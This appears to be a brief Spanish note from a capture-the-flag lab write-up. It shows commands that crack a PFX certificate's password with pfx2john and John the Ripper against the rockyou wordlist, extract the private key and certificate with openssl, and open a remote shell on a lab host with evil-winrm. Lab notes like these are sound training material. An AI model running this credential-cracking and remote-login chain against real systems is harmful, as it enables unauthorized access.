- hay que sacar la clave si tiene
```bash
pfx2john legacyy_dev_auth.pfx > hash.txt
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

- Luege genero la key
```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx  -nokeys -out certificate.pem

evil-winrm -i 10.10.11.152 -c certificate.pem -k priv-key.pem -S
```
